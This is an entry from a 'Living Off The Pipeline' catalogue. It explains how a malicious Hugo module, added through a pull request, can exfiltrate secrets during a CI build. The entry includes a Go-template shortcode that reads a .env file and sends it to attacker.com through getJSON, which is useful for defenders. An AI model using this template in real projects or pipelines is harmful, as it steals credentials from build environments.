---
layout: tool
title: hugo
tags: [cli, config-file, file-read, network-access]
references:
- https://gohugo.io/hugo-modules/
- https://gohugo.io/functions/readfile/
- https://gohugo.io/functions/getjson/
files: [config.toml, config.yaml, config.json]
---

## Living Off The Pipeline - hugo

`Hugo` is a popular static site generator. While it is heavily sandboxed to prevent templates from executing shell commands, its powerful module and templating system can be abused to create a "Living Off The Pipeline" (LOTP) gadget for data exfiltration.

### First-Order LOTP Gadget

`hugo` is a **First-Order LOTP Gadget**. It does not provide RCE, but it can be tricked by a malicious module and template into reading local files and sending their contents over the network.

#### Malicious Primitives: Arbitrary File Read + Arbitrary Network Access

The attack vector relies on combining three features:
1.  **Hugo Modules:** A project's configuration file (e.g., `config.toml`) can specify remote modules to be imported. An attacker can add their own malicious module in a pull request.
2.  **`readFile` function:** Hugo's templating language allows reading files from within the project directory.
3.  **`getJSON` function:** This function is intended to fetch and parse remote JSON files, but it can be used to make an arbitrary GET request to any URL.

An attacker can create a malicious module containing a template that uses `readFile` to get the contents of a sensitive file (e.g., a `.env` file) and then uses `getJSON` to send that content to their own server.

### Real-World Attack Scenario

1.  **Attacker's PR:** An attacker submits a pull request containing:
    *   A modified `config.toml` file that imports their malicious module.
        ```toml
        [module]
          [[module.imports]]
            path = "github.com/attacker/malicious-hugo-module"
        ```
    *   The malicious module contains a template (e.g., a shortcode) that will be rendered during the build.
        ```go-template
        <!-- layouts/shortcodes/pwn.html -->
        {{ $secret_file := ".env" }}
        {{ if (fileExists $secret_file) }}
          {{ $secret_content := readFile $secret_file | urlquery }}
          {{ $exfil := getJSON (printf "https://attacker.com/?data=%s" $secret_content) }}
        {{ end }}
        ```

2.  **Vulnerable Workflow:** The pipeline contains a completely standard command to build the Hugo site.
    ```yaml
    - name: Build site
      run: hugo
    ```

3.  **Execution:**
    *   The `hugo` command is executed.
    *   It downloads the attacker's malicious module specified in the config file.
    *   During site generation, Hugo renders the attacker's shortcode.
    *   The `readFile` function reads the `.env` file from the repository root.
    *   The `getJSON` function makes a GET request to the attacker's server, with the URL-encoded contents of the `.env` file in the query string.

This attack is dangerous because the CI/CD workflow file is benign. The malicious payload is hidden within the templating logic of a remote dependency.